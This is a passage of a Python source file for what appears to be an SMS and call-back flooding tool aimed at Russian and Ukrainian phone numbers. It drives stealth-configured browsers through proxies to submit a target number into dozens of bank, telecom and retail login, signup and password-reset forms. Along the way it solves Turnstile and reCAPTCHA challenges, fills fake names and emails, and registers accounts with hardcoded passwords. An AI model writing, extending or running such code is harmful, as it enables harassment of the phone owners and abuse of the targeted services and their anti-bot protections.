from __future__ import annotations

import asyncio
import logging
import os
import sys
import time
from faker import Faker as FakerClass
from typing import Any, Awaitable, Callable, Protocol
import pathlib
from pathlib import Path
from db import parse_phone
from proxies import parse_proxy
from patchright.async_api import (
    Browser,
    BrowserContext,
    Page,
    Playwright,
    async_playwright,
)
from turnstile_solver import (
    TurnstileChallenge,
    TurnstileError,
    TurnstileResult,
    TurnstileSolver,
    apply_turnstile_token,
    detect_turnstile,
    solve_for_page,
)
from recaptcha_v2 import (
    RecaptchaBlocked,
    RecaptchaV2Challenge,
    RecaptchaV2Error,
    RecaptchaV2Result,
    apply_recaptcha_token,
    detect_recaptcha_v2,
    solve_v2_for_page,
)

faker = FakerClass(locale="ru_RU")
logger = logging.getLogger(__name__)

__all__ = [
    "BrowserError",
    "BrowserRunner",
    "BrowserAttack",
    "BrowserService",
    "SERVICES",
    "SERVICE_COUNTRIES",
    "dial",
    "format_phone",
    "first_visible",
    "proxy_settings",
    "service",
    "rabotavdodo",
    "raiffaisen",
    "finuslugi",
    "tbank",
    "t2",
    "avito",
    "befree",
    "sber",
    "cloudtips",
    "lava",
    "silpo",
    "TurnstileChallenge",
    "TurnstileError",
    "TurnstileResult",
    "TurnstileSolver",
    "apply_turnstile_token",
    "detect_turnstile",
    "turnstile_challenge",
    "solve_turnstile",
    "RecaptchaBlocked",
    "RecaptchaV2Challenge",
    "RecaptchaV2Error",
    "RecaptchaV2Result",
    "apply_recaptcha_token",
    "detect_recaptcha_v2",
    "recaptcha_challenge",
    "solve_recaptcha_v2",
]

locale = "ru-RU"
timezone = "Europe/Moscow"
viewport = {"width": 1280, "height": 720}
DEFAULT_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
)

_PREFIXES = {
    "RU": {"+7": "+7", "7": "7", "8": "8", "9": ""},
    "UA": {"+380": "+380", "380": "380", "0": "0", "": ""},
}

_LAUNCH_ARGS = [
    "--no-sandbox",
    "--disable-setuid-sandbox",
    "--disable-dev-shm-usage",
    "--disable-gpu",
    "--disable-software-rasterizer",
    "--disable-accelerated-2d-canvas",
    "--ignore-certificate-errors",
    "--disable-blink-features=AutomationControlled",
    "--no-first-run",
    "--no-default-browser-check",
    "--disable-extensions",
    "--disable-sync",
    "--disable-default-apps",
    "--disable-speech-api",
    "--disable-media-session-api",
    "--mute-audio",
    "--autoplay-policy=user-gesture-required",
    "--disk-cache-size=33554432",
    "--js-flags=--max-old-space-size=256",
    "--renderer-process-limit=4",
    "--disable-features=Translate,MediaRouter,OptimizationHints,BackForwardCache",
]

def dial(digits: str) -> str:
    raw = str(digits).strip()
    return "+" + raw if not raw.startswith("+") else raw

def _split(raw: str) -> tuple[str, str]:
    digits, country = parse_phone(raw)
    if country == "UA" and digits.startswith("380"):
        return "UA", digits[3:]
    if country == "RU" and digits.startswith("7"):
        return "RU", digits[1:]
    if len(digits) > 10:
        return country, digits[-10:]
    return country, digits

def format_phone(raw: str, mode: str = "+7") -> str:
    country, national = _split(raw)
    if "#" in mode:
        if mode.count("#") != len(national):
            raise ValueError(
                f"в режиме {mode!r} нужно {len(national)} символов #")
        digits = iter(national)
        return "".join(next(digits) if ch == "#" else ch for ch in mode)

    prefix_map = _PREFIXES.get(country, _PREFIXES["RU"])
    prefix = prefix_map.get(mode.strip())
    if prefix is None:
        modes = ", ".join(prefix_map)
        raise ValueError(f"режим {mode!r} не подходит для {country}: {modes}")
    return prefix + national

def _proxy_config(proxy_obj: Any = None) -> dict[str, str] | None:
    if not proxy_obj:
        return None
    if isinstance(proxy_obj, dict):
        return proxy_obj
    if hasattr(proxy_obj, "browser_config") and callable(proxy_obj.browser_config):
        return proxy_obj.browser_config()
    if hasattr(proxy_obj, "host") and hasattr(proxy_obj, "port") and hasattr(proxy_obj, "scheme"):
        scheme = str(proxy_obj.scheme).replace("socks5h", "socks5")
        cfg = {"server": f"{scheme}://{proxy_obj.host}:{proxy_obj.port}"}
        if getattr(proxy_obj, "username", None):
            cfg["username"] = str(proxy_obj.username)
            if getattr(proxy_obj, "password", None):
                cfg["password"] = str(proxy_obj.password)
        return cfg
    if isinstance(proxy_obj, str):
        entry = parse_proxy(proxy_obj)
        if entry is not None:
            return _proxy_config(entry)
        clean = proxy_obj.replace("socks5h://", "socks5://")
        return {"server": clean}
    return None

def proxy_settings(proxy_url: str = "") -> dict[str, str] | None:
    return _proxy_config(proxy_url)

async def first_visible(
    page: Any, selectors: tuple[str, ...] | list[str], timeout: float = 10.0
) -> Any:
    if not selectors:
        return None
    each = max(500, int(timeout * 1000 / max(1, len(selectors))))
    for selector in selectors:
        try:
            locator = page.locator(selector).first
            await locator.wait_for(state="visible", timeout=each)
            return locator
        except Exception:
            continue
    return None

async def turnstile_challenge(
    page: Any,
    *,
    sitekey: str = "",
    action: str = "",
    timeout: float = 2.0,
) -> TurnstileChallenge | None:
    try:
        return await detect_turnstile(
            page,
            sitekey=sitekey or None,
            action=action or None,
            timeout=timeout,
        )
    except asyncio.CancelledError:
        raise
    except Exception as exc:
        logger.debug("turnstile: не удалось определить виджет: %r", exc)
        return None

async def solve_turnstile(
    page: Any,
    *,
    url: str = "",
    sitekey: str = "",
    action: str = "",
    cdata: str = "",
    timeout: float = 30.0,
    apply: bool = True,
    strict: bool = False,
    solver: TurnstileSolver | None = None,
) -> str | None:
    return await solve_for_page(
        page,
        url=url or None,
        sitekey=sitekey or None,
        action=action or None,
        cdata=cdata or None,
        timeout=timeout,
        apply=apply,
        strict=strict,
        solver=solver,
    )

async def recaptcha_challenge(
    page: Any,
    *,
    sitekey: str = "",
    timeout: float = 2.0,
) -> RecaptchaV2Challenge | None:
    try:
        return await detect_recaptcha_v2(
            page,
            sitekey=sitekey or None,
            timeout=timeout,
        )
    except asyncio.CancelledError:
        raise
    except Exception as exc:
        logger.debug("recaptcha v2: не удалось определить виджет: %r", exc)
        return None

async def solve_recaptcha_v2(
    page: Any,
    *,
    sitekey: str = "",
    timeout: float = 120.0,
    step_timeout: float = 10.0,
    attempts: int = 3,
    play: bool = False,
    backend: str = "patchright",
    apply: bool = True,
    strict: bool = False,
) -> str | None:
    return await solve_v2_for_page(
        page,
        sitekey=sitekey or None,
        timeout=timeout,
        step_timeout=step_timeout,
        attempts=attempts,
        play=play,
        backend=backend,
        apply=apply,
        strict=strict,
    )

class BrowserError(RuntimeError):
    pass

class Channel(Protocol):
    stopped: bool
    deadline: float

    async def acquire_rate(self) -> bool: ...
    async def pause(self, seconds: float) -> None: ...
    def note_request(self, status: int, service: str = "",
                     *, accepted: bool = False) -> None: ...

    def note_error(self, kind: str) -> None: ...

class BrowserService:
    name: str = ""
    url: str = ""

    async def send(self, page: Any, phone: str) -> bool:
        raise NotImplementedError

    async def __call__(self, page: Any, phone: str) -> bool:
        return await self.send(page, phone)

    async def turnstile(self, page: Any, **options: Any) -> str | None:
        return await solve_turnstile(page, **options)

    async def recaptcha_v2(self, page: Any, **options: Any) -> str | None:
        return await solve_recaptcha_v2(page, **options)

ServiceFn = Callable[[Page, str], Awaitable[bool]]
SERVICES: dict[str, ServiceFn] = {}
SERVICE_COUNTRIES: dict[str, str] = {}

def service(name: str | None = None, country: str = "RU") -> Callable[[ServiceFn], ServiceFn]:
    def decorator(fn: ServiceFn) -> ServiceFn:
        svc_name = name or fn.__name__
        setattr(fn, "name", svc_name)
        setattr(fn, "country", country)
        setattr(fn, "send", fn)
        SERVICES[svc_name] = fn
        SERVICE_COUNTRIES[svc_name] = country
        return fn
    return decorator

def _service_name(svc: Any) -> str:
    if hasattr(svc, "name") and svc.name:
        return str(svc.name)
    if hasattr(svc, "__name__"):
        return str(svc.__name__)
    return type(svc).__name__

async def _invoke_service(svc: Any, page: Any, phone: str) -> bool:
    if hasattr(svc, "send") and callable(svc.send):
        return bool(await svc.send(page, phone))
    if isinstance(svc, type):
        inst = svc()
        if hasattr(inst, "send") and callable(inst.send):
            return bool(await inst.send(page, phone))
        return bool(await inst(page, phone))
    return bool(await svc(page, phone))

@service("rabotavdodo", country="RU")
async def rabotavdodo(page: Page, phone: str) -> bool:
    phone_fmt = format_phone(phone, "9")
    await page.goto("https://rabotavdodo.ru/", wait_until="commit", timeout=12000)
    field = await first_visible(
        page,
        (
            'input[placeholder*="Номер телефона"]',
            'input[type="tel"]',
            'input[name="phone"]',
        ),
        timeout=8.0,
    )
    if field is None:
        field = page.get_by_placeholder("Номер телефона").first
        await field.wait_for(state="visible", timeout=4000)
    await field.fill(phone_fmt)
    await page.wait_for_timeout(500)
    await page.keyboard.press("Enter")
    await page.wait_for_timeout(1500)
    return True

@service("raiffaisen", country="RU")
async def raiffaisen(page: Page, phone: str) -> bool:
    phone_fmt = format_phone(phone, "7")
    await page.goto("https://online.raiffeisen.ru/login/main", wait_until="commit", timeout=15000)
    btn = await first_visible(page, ('button:has-text("Войти")', 'button[type="submit"]'), timeout=4.0)
    if btn is not None:
        try:
            await btn.click()
            await page.wait_for_timeout(2000)
        except Exception:
            pass
    field = await first_visible(
        page,
        ('#phone-input', 'input[type="tel"]',
         'input[name="phone"]', 'input[name="login"]'),
        timeout=10.0,
    )
    if field is None:
        field = page.locator('input[type="tel"]').first
        await field.wait_for(state="visible", timeout=6000)
    await field.fill(phone_fmt)
    await page.wait_for_timeout(500)
    await page.keyboard.press("Enter")
    await page.wait_for_timeout(1500)
    return True



@service("aztechno", country="UA")
async def aztechno(page: Page, phone: str) -> bool:
    phone_fmt = format_phone(phone, "380")
    await page.goto('https://aztechno.lviv.ua/callmeback/',wait_until="domcontentloaded", timeout=12000)
    field = await first_visible(page, ('input[type="tel"]', 'input[name="phone"]', 'input[placeholder*="телефон"]'), timeout=8.0)
    if field is None:
        field = page.locator('input[type="tel"]').first
        await field.wait_for(state="visible", timeout=4000)
    await field.fill(phone_fmt)
    await page.wait_for_timeout(500)
    await page.keyboard.press("Enter")
    await page.wait_for_timeout(1500)
    return True



@service("eko-myaso", country="UA")
async def eko_myaso(page: Page, phone: str) -> bool:
    phone_fmt = format_phone(phone, "0")
    await page.goto('https://eko-myaso.com.ua/callmeback/',wait_until="domcontentloaded", timeout=12000)
    field = await first_visible(page, ('input[type="tel"]', 'input[name="phone"]', 'input[placeholder*="телефон"]'), timeout=8.0)
    if field is None:
        field = page.locator('input[type="tel"]').first
        await field.wait_for(state="visible", timeout=4000)
    await field.fill(phone_fmt)
    await page.locator("input[name='name']").fill(faker.name())
    await page.locator("span:has-text('Замовити дзвінок')").click()
    await page.wait_for_timeout(1500)
    return True


@service("selfiecredit", country="UA")
async def selfiecredit(page: Page, phone: str) -> bool:
    phone_fmt = format_phone(phone, "0")
    await page.goto('https://selfiecredit.ua/user/registration/reg1',wait_until="domcontentloaded", timeout=12000)
    field = await first_visible(page, ('input[type="tel"]', 'input[name="phone"]', 'input[placeholder*="телефон"]'), timeout=8.0)
    if field is None:
        field = page.locator('input[type="tel"]').first
        await field.wait_for(state="visible", timeout=4000)
    await field.fill(phone_fmt)
    await page.wait_for_timeout(500)
    # <input class="_dateInput_egw0o_1" placeholder="ДД.ММ.РРРР" id="date_of_birth" inputmode="numeric" value="" name="date_of_birth">
    await page.get_by_placeholder("ДД.ММ.РРРР").fill("01.01.2000")
    await page.wait_for_timeout(500)
    await page.keyboard.press("Enter")
    await page.wait_for_timeout(1500)
    return True


@service("starfinance", country="UA")
async def starfinance(page: Page, phone: str) -> bool:
    phone_fmt = format_phone(phone, "0")
    await page.goto("https://starfin.com.ua/auth/login?affiliate=affisestarfinance&utm_source=affiliate_CPA&utm_medium=friends&utm_content=084773&utm_campaign=&clickid=6b0443fa75d029000121be09&token=&amount=", wait_until="domcontentloaded", timeout=12000)
    field = await first_visible(page, ('input[type="tel"]', 'input[name="phone"]', 'input[placeholder*="телефон"]'), timeout=8.0)
    if field is None:
        field = page.locator('input[type="tel"]').first
        await field.wait_for(state="visible", timeout=4000)
    await field.fill(phone_fmt)
    await page.wait_for_timeout(500)
    await page.keyboard.press("Enter")
    await page.wait_for_timeout(1500)
    return True

@service("svoi", country="RU")
async def svoi(page: Page, phone: str) -> bool:
    phone_fmt = format_phone(phone, "9")
    await page.goto("https://svoi.ru/online/login/", wait_until="domcontentloaded", timeout=12000)
    await page.get_by_data_test_id("login-phone-input").first.fill(phone_fmt)
    await page.wait_for_timeout(500)
    await page.keyboard.press("Enter")
    await page.wait_for_timeout(1500)
    return True

@service("pochta",country="RU")
async def pochta(page: Page, phone: str) -> bool:
    phone_fmt = format_phone(phone, "9")
    await page.goto(f"https://passport.pochta.ru/pc/ext/v2.0/form/password/lost?callbackurl=https%3A%2F%2Fpassport.pochta.ru%2Foauth2%2Fauthorize%3Fclient_id%3Dp3anTjRrMmp_yjzc8JoQgB6DhzMa%26scope%3Dopenid%2520firstName%2520lastName%2520middleName%2520userName%2520birthdate%2520email%2520phone%2520address%2520snils%2520uai%2520pepActivate%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fwww.pochta.ru%252Fapi%252Fauth%252Fcallback%26nonce%3DEhDQwDnPL1BNrKZrPRgyU3JqL0GsqNlxO3yq1cb1REw%26state%3DeyJyZXR1cm5UbyI6Imh0dHBzOi8vd3d3LnBvY2h0YS5ydS9hY2NvdW50In0%26partyType%3DPHYSICAL%26lang%3Dru%26group%3Dportal%26display%3Dpage&amp;display=page&amp;dm=l&amp;phone={phone_fmt}", wait_until="domcontentloaded", timeout=12000)
    await page.wait_for_timeout(1000)
    return True


@service("finuslugi", country="RU")
async def finuslugi(page: Page, phone: str) -> bool:
    phone_fmt = format_phone(phone, "9")
    url = (
        "https://sso2.moex.com/auth/realms/craml/protocol/openid-connect/auth?"
        "protocol=oauth2&response_type=code&response_mode=query&client_id=touchcraml_public&"
        "redirect_uri=https%3A%2F%2Flk.finuslugi.ru%2Fcallback&scope=openid+email+profile&"
        "code_challenge=_awx9XGIuzg6SfyJxUaas_qEqmAU31bfRxQQRhxC2W0&code_challenge_method=S256&"
        "nonce=NGXQtlnEsULT-oGcHRlyIKCvh04wGrsX&state=eyJzaW1wbGUiOnRydWUsInN0YXRlSWQiOiIxTHdzN1JoMHpZNVlGdUEtY1phUDkiLCJicm93c2VySWQiOiJmMzhlZDQ2Zi1mYWY1LTQzYjgtYjg3Ny1jOTdmMjIxODUxOGUiLCJicm93c2VyU2Vzc2lvbklkIjoiNDc5Nzk4MjEtMGI2YS00OTM3LTk5YjEtNTIxNTBhMTdmYTNlIiwiZmluZ2VycHJpbnRIYXNoIjoiODc5MzMwOWNhNjE3NWYxODBjYjRkYzZmNDMxMzExNmQiLCJwaG9uZVZlcmlmeSI6InRydWUiLCJlbnRyeVBvaW50SWQiOiJsayJ9"
    )
    await page.goto(url, wait_until="commit", timeout=12000)
    field = await first_visible(
        page,
        (
            '#simple-registration-input-phone',
            'input[type="tel"]',
            'input[name="phone"]',
            'input[placeholder*="телефон"]',
        ),
        timeout=8.0,
    )
    if field is None:
        field = page.locator("#simple-registration-input-phone")
        await field.wait_for(state="visible", timeout=4000)
    await field.fill(phone_fmt)
    await page.wait_for_timeout(500)
    await page.keyboard.press("Enter")
    await page.wait_for_timeout(1500)
    return True

@service("tbank", country="RU")
async def tbank(page: Page, phone: str) -> bool:
    phone_fmt = format_phone(phone, "9")
    url = (
        "https://www.tbank.ru/api/common/v1/session/authorize/?theme=default&display=page&"
        "origin=web%2Cib5%2Cplatform&complete_uri=https%3A%2F%2Fwww.tbank.ru%2Fauth%2F&"
        "post_complete_redirect_uri=https%3A%2F%2Fwww.tbank.ru%2Finvest%2Fsocial%2Fprofile%2F"
        "basebel%2F0a891451-8598-4eda-bda0-aa2b1e89600a%2F"
    )
    await page.goto(url, wait_until="commit", timeout=12000)
    field = await first_visible(
        page,
        ('input[type="tel"]', 'input[name="phone"]',
         'input[autocomplete="tel"]'),
        timeout=8.0,
    )
    if field is None:
        field = page.locator('input[type="tel"]').first
        await field.wait_for(state="visible", timeout=4000)
    await field.fill(phone_fmt)
    await page.wait_for_timeout(500)
    await page.keyboard.press("Enter")
    await page.wait_for_timeout(1500)
    return True

@service("sber", country="RU")
async def sber(page: Page, phone: str) -> bool:
    phone_fmt = format_phone(phone, "9")
    try:
        await page.goto("https://id.sber.ru/profile/main", wait_until="commit", timeout=15000)
    except Exception:
        await page.goto("https://id.sber.ru", wait_until="commit", timeout=15000)

    login_btn = page.locator(
        'a:has-text("Войти в личный кабинет"), a[href*="/profile/main"]').first
    if await login_btn.is_visible():
        try:
            await login_btn.click()
        except Exception:
            pass

    field = page.locator('#phoneInput, input[type="tel"]').first
    await field.wait_for(state="visible", timeout=12000)
    await field.click()
    await page.keyboard.type(phone_fmt, delay=40)
    await page.wait_for_timeout(500)
    await page.keyboard.press("Enter")
    await page.wait_for_timeout(2000)
    return True

@service("rt", country="RU")
async def rt(page: Page, phone: str) -> bool:
    phone = format_phone(phone, "9")
    await page.goto('https://b2c.passport.rt.ru/', wait_until='domcontentloaded', timeout=12000)
    locator = page.locator('button#back_to_otp_btn')
    await locator.wait_for(state='visible', timeout=30000)
    await locator.click(force=True)
    await page.wait_for_timeout(1500)
    await page.locator("input#address").first.fill(phone)
    await page.wait_for_timeout(500)
    await page.keyboard.press("Enter")
    await page.wait_for_timeout(2000)
    return True

@service("fora", country='UA')
async def fora(page: Page, phone: str) -> bool:
    phone_fmt = format_phone(phone, '0')
    await page.goto("https://my.fora.ua/", wait_until='domcontentloaded', timeout=12000)
    field = await first_visible(page, ('input[name="phone"]', 'input[type="tel"]', 'input[placeholder*="телефон"]'), timeout=8.0)
    if field is None:
        field = page.locator('input[type="tel"]').first
        await field.wait_for(state='visible', timeout=4000)
    await field.type(phone_fmt)
    await page.wait_for_timeout(500)
    await page.keyboard.press("Enter")
    await page.wait_for_timeout(2000)
    await page.screenshot(path=pathlib.Path("screenshots/fora_screenshot.png"))
    return True

@service("sota", country='UA')
async def sota(page: Page, phone: str) -> bool:
    phone = format_phone(phone, "0")
    await page.goto('https://my.sota-buh.com.ua/account/register', wait_until='domcontentloaded', timeout=12000)
    await asyncio.sleep(1)
    locator = page.locator('input#Phone')
    await locator.wait_for(state='visible', timeout=8000)
    await locator.type(phone)
    locator = page.locator('input#Password')
    await locator.wait_for(state='visible', timeout=8000)
    await locator.type(r'*j0^Lb\l2}?E[o.')
    locator = page.locator('input#ConfirmPassword')
    await locator.type(r'*j0^Lb\l2}?E[o.')
    locator = page.locator('input#Name')
    await locator.type('бурмалда')
    locator = page.locator('input#Email')
    await locator.type(f"{faker.email()}")
    await page.keyboard.press("Enter")
    await page.wait_for_timeout(2000)
    await page.screenshot(path=pathlib.Path("screenshots/sota_screenshot.png"))
    return True

@service("cloudtips", country="RU")
async def cloudtips(page: Page, phone: str) -> bool:
    phone_fmt = format_phone(phone, "9")
    try:
        await page.goto("https://lk.cloudtips.ru/", wait_until="domcontentloaded", timeout=20000)
    except Exception:
        await page.goto("https://lk.cloudtips.ru/", wait_until="commit", timeout=15000)

    field = await first_visible(
        page,
        (
            'input[automation-id="phone-input"]',
            'input[name="phone"]',
            'input[type="tel"]',
            'input[placeholder*="123-45-67"]',
            'input[placeholder*="телефон"]',
            'input[placeholder*="Телефон"]',
        ),
        timeout=12.0,
    )
    if field is not None:
        try:
            await field.click()
            await page.wait_for_timeout(300)
        except Exception:
            pass

    await page.keyboard.type(phone_fmt, delay=40)
    await page.wait_for_timeout(500)
    await page.keyboard.press("Enter")
    await page.wait_for_timeout(2000)
    return True

@service("t2", country="RU")
async def t2(page: Page, phone: str) -> bool:
    phone = format_phone(phone, "9")
    try:
        await page.goto("https://t2.ru/", wait_until="domcontentloaded", timeout=20000)
    except Exception:
        await page.goto("https://t2.ru/", wait_until="commit", timeout=15000)

    await page.wait_for_timeout(1000)
    await page.get_by_text("Войти").first.click(force=True)
    await page.wait_for_timeout(1000)
    await page.keyboard.type(phone, delay=40)
    await page.wait_for_timeout(500)
    await page.keyboard.press("Enter")
    await page.wait_for_timeout(1000)
    return True

@service("lava", country="RU")
async def lava(page: Page, phone: str) -> bool:
    phone_fmt = format_phone(phone, "+7")
    try:
        await page.goto("https://lava.ru/signup", wait_until="domcontentloaded", timeout=20000)
    except Exception:
        await page.goto("https://lava.ru/signup", wait_until="commit", timeout=15000)

    login_input = page.locator(
        'input[data-testid="sign-up-login-input"], input[placeholder*="телефона"]').first
    await login_input.wait_for(state="visible", timeout=12000)
    await login_input.click()
    await page.keyboard.type(phone_fmt, delay=40)
    await page.wait_for_timeout(300)

    cb = page.locator('input[data-testid="sign-up-consent-checkbox"]')
    if await cb.count() > 0 and not await cb.is_checked():
        try:
            await cb.check(force=True)
        except Exception:
            pass

    await page.keyboard.press("Enter")
    await page.wait_for_timeout(500)

    p1 = page.locator(
        'input[data-testid="sign-up-password-input"], #password').first
    await p1.wait_for(state="visible", timeout=10000)
    await p1.click()
    await page.keyboard.type("Ejfhshj2", delay=40)
    await page.wait_for_timeout(300)

    p2 = page.locator(
        'input[data-testid="sign-up-password-confirmation-input"], #secondPassword').first
    await p2.click()
    await page.keyboard.type("Ejfhshj2", delay=40)
    await page.wait_for_timeout(300)

    await page.keyboard.press("Enter")
    await page.wait_for_timeout(500)
    exists_loc = page.locator("text=уже существует")
    if await exists_loc.count() > 0 and await exists_loc.first.is_visible():
        try:
            await page.goto("https://lava.ru/restore", wait_until="domcontentloaded", timeout=15000)
        except Exception:
            await page.goto("https://lava.ru/restore", wait_until="commit", timeout=12000)

        r_login = page.locator(
            'input[data-testid="restore-login-input"], input[placeholder*="телефона"], input[type="text"]').first
        await r_login.wait_for(state="visible", timeout=10000)
        await r_login.click()
        await page.keyboard.type(phone_fmt, delay=40)
        await page.wait_for_timeout(300)

        r_btn = page.locator(
            'button[data-testid="restore-submit-button"], button:has-text("Продолжить")').first
        if await r_btn.count() > 0 and await r_btn.is_visible():
            await r_btn.click()
        else:
            await page.keyboard.press("Enter")

        await page.wait_for_timeout(500)

        rp1 = page.locator(
            'input[data-testid="restore-password-input"], input[data-testid*="password"], #password, input[type="password"]').first
        await rp1.wait_for(state="visible", timeout=8000)
        await rp1.click()
        await page.keyboard.type("Ejfhshj2", delay=40)
        await page.wait_for_timeout(300)

        rp2 = page.locator(
            'input[data-testid="restore-password-confirmation-input"], input[data-testid*="confirmation"], #secondPassword').first
        if not (await rp2.count() and await rp2.is_visible()):
            rp2 = page.locator('input[type="password"]').nth(1)
        if await rp2.count() > 0 and await rp2.is_visible():
            await rp2.click()
            await page.keyboard.type("Ejfhshj2", delay=40)
            await page.wait_for_timeout(300)

        r_btn2 = page.locator(
            'button:has-text("Продолжить"), button[type="submit"]').first
        if await r_btn2.count() > 0 and await r_btn2.is_visible():
            await r_btn2.click()
        else:
            await page.keyboard.press("Enter")

        await page.wait_for_timeout(1000)

    return True

@service("bao", country="UA")
async def bao(page: Page, phone: str) -> bool:
    phone_fmt = format_phone(phone, "")
    try:
        await page.goto("https://bao.ua/kyiv/profile/auth/", wait_until='domcontentloaded', timeout=30000)
        field = page.locator('input#phone').first
        await field.wait_for(state="visible", timeout=15000)
        await field.click()
        await field.fill("")
        await field.press_sequentially(phone_fmt, delay=20)
        await page.wait_for_timeout(500)
        await page.keyboard.press("Enter")
        await page.wait_for_timeout(1000)
        return True
    except Exception:
        return False

@service("sravni_sber", country="RU")
async def sravni_sber(page: Page, phone: str) -> bool:
    phone = format_phone(phone, '9')
    await page.goto('https://id.sber.ru/?client_id=55704d51-19cf-4b6c-a27c-5a39be54c146&client_type=PRIVATE&scope=openid%20name%20birthdate%20maindoc%20inn%20snils%20mobile%20email%20gender%20driving_license%20international_passport%20priority_doc%20citizenship%20place_of_birth%20address_reg%20work_address%20address_of_actual_residence%20sts%20is_self_employed%20previous_name%20education%20place_of_work%20job_title%20marital_status&response_type=code&redirect_uri=https%3A%2F%2Fsravni.id%2Fsignin-sber&state=0922D40F8B54A2DA7C6C00A509D8EB4CE398364924B332BB38F8713F47&nonce=1EC7C8399C170E68E0108658512CFF6BA6A4FC7D1F7F5FF80739512D55&display=page', wait_until='domcontentloaded', timeout=10000)
    locator = page.locator('input#phoneInput')
    await locator.wait_for(state='visible', timeout=15000)
    await locator.fill("")
    await locator.press_sequentially(phone, delay=50)
    await page.keyboard.press("Enter")
    await page.wait_for_timeout(500)
    await page.locator('p[title="Получить СМС-код"]').first.click()
    await page.wait_for_timeout(500)
    return True

@service("sravni_tbank", country="RU")
async def sravni_tbank(page: Page, phone: str) -> bool:
    phone = format_phone(phone, '9')
    await page.goto('https://sravni.id/signin/tbank?returnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dwww%26scope%3Dopenid%2520offline_access%2520email%2520phone%2520profile%2520roles%2520reviews%2520esia%2520orders.r%2520messagesender.sms%2520Sravni.Reviews.Service%2520Sravni.Osago.Service%2520Sravni.QnA.Service%2520Sravni.FileStorage.Service%2520Sravni.PhoneVerifier.Service%2520Sravni.Identity.Service%2520Sravni.Affiliates.Service%2520Sravni.News.Service%2520identity.user.w%26response_type%3Dcode%2520id_token%26redirect_uri%3Dhttps%253A%252F%252Fwww.sravni.ru%252Fopenid%252Fv2%252Fcallback%252F%26display%3Dpopup%26response_mode%3Dform_post%26state%3DeyJzYWx0IjoiZFkwd1Q0Wkl4Tm9kc2Z0WHJrUEpzdm90NXY0eGFoV3dkamNaVWNIcmJtWSJ9%26nonce%3DKag2yzh-3Q_XxkOFXBFCy2LAjmIiEzCt5wqbU51As7M%26acr_values%3Dasi%253AxjDrD3ystnBPLZqn%2520origin%253Ahttps%253A%252F%252Fwww.sravni.ru%252F%2520anonymous%253AYY2Qy2usSEaAd3Ng7R72Aw%2520login_expires%253A2026-11-19T16%253A06%253A17.147Z', wait_until='domcontentloaded', timeout=10000)
    await asyncio.sleep(2)
    locator = page.locator('input[automation-id="phone-input"]')
    await locator.wait_for(state='visible', timeout=15000)
    await locator.press_sequentially(phone, delay=20)
    await page.keyboard.press("Enter")
    await asyncio.sleep(2)
    return True

@service('sravni_alfa')
async def sravni_alfa(page: Page, phone: str) -> bool:
    phone = format_phone(phone, '9')
    await page.goto('https://sravni.id/signin/alfa?returnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dwww%26scope%3Dopenid%2520offline_access%2520email%2520phone%2520profile%2520roles%2520reviews%2520esia%2520orders.r%2520messagesender.sms%2520Sravni.Reviews.Service%2520Sravni.Osago.Service%2520Sravni.QnA.Service%2520Sravni.FileStorage.Service%2520Sravni.PhoneVerifier.Service%2520Sravni.Identity.Service%2520Sravni.Affiliates.Service%2520Sravni.News.Service%2520identity.user.w%26response_type%3Dcode%2520id_token%26redirect_uri%3Dhttps%253A%252F%252Fwww.sravni.ru%252Fopenid%252Fv2%252Fcallback%252F%26display%3Dpopup%26response_mode%3Dform_post%26state%3DeyJzYWx0IjoiZEpxR01mX1RWZFVHd0JXQzQ0VVliYkZEV1NtYlpKUDV0MC10SG5PUDFJayJ9%26nonce%3D6H9EI37Vv8uP0RlygZXUm0hG07iPt_-tgkismXntA6c%26acr_values%3Dasi%253A2pOzMh4lRhMSn-_b%2520origin%253Ahttps%253A%252F%252Fwww.sravni.ru%252F%2520anonymous%253AYY2Qy2usSEaAd3Ng7R72Aw%2520login_expires%253A2026-11-19T16%253A09%253A51.008Z', wait_until="domcontentloaded", timeout=10000)
    locator = page.locator('input[data-test-id="input-phone"]')
    await locator.wait_for(state='visible', timeout=15000)
    await locator.press_sequentially(phone, delay=20)
    await page.keyboard.press("Enter")
    await asyncio.sleep(1)
    return True

@service("kyper", country='RU')
async def kyper(page: Page, phone: str) -> bool:
    phone = format_phone(phone, "7")
    await page.goto(f'https://id.sber.ru/CSAFront/oidc/authorize.do?client_id=09a6f842-ed4d-4b42-a925-3bc75e77335e&client_type=PRIVATE&nonce=7f4848fe308653d46fbc285f896f0c6970e3cb08b4121c1fa362baa2ecb0b778&redirect_uri=https%3A%2F%2Fweb.kuper.ru%2Fauth%2Fsber-id%2Fbasic%3Futm_source%3Dcontrol&state=28d3326806de626d48c82cab7a96115c98ca52e5912c5165&scope=openid+name+mobile+email+birthdate+gender+delivery_address+offline_access&response_type=code&login_hint=%2B{phone}&channel=browser&isCloud=true&logUid=e445d54fea8e43a9b20dee83daa2a776')
    await page.wait_for_timeout(1000)
    return True

@service("silpo", country="UA")
async def silpo(page: Page, phone: str) -> bool:
    phone_fmt = format_phone(phone, "+380")
    await page.goto("https://auth.silpo.ua/login", wait_until="commit", timeout=12000)
    field = await first_visible(
        page,
        (
            'input[name="phoneNumber"]',
            'input[type="tel"]',
            'input[name="phone"]',
            'input[autocomplete="tel"]',
            'input[placeholder*="телефон"]',
            'input[placeholder*="Телефон"]',
        ),
        timeout=8.0,
    )
    if field is None:
        field = page.locator('input[type="tel"]').first
        await field.wait_for(state="visible", timeout=4000)
    await field.fill(phone_fmt)
    await page.wait_for_timeout(1000)
    btn = await first_visible(
        page,
        (
            'button:has-text("Увійти")',
            'button:has-text("Продовжити")',
            'button[type="submit"]',
        ),
        timeout=3.0,
    )
    if btn is not None:
        await btn.click()
    else:
        await page.keyboard.press("Enter")
    await page.wait_for_timeout(2000)
    return True

_BLOCKED_TRACKERS = (
    "connect.facebook.net",
    "sentry.io",
    "hotjar.com",
    "clarity.ms",
    "chatra.io",
    "jivosite.com",
    "carrotquest.io",
    "calltouch.ru",
)

async def _route_filter(route: Any) -> None:
    try:
        req = route.request
        url = req.url.lower()
        res_type = req.resource_type

        if any(token in url for token in (
            "captcha", "turnstile", "recaptcha", "cloudflare", "challenge",
            "smartcaptcha", "hcaptcha", "gstatic.com/recaptcha", "google.com/recaptcha",
